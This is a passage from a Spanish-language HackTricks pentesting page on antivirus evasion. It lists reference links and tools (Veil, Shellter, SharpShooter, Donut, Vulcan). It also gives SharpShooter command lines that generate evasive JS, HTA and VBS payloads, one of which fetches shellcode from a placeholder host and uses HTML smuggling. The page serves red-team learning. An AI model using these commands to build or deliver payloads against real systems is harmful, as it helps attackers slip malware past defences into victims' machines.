* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Otras herramientas
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Más

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
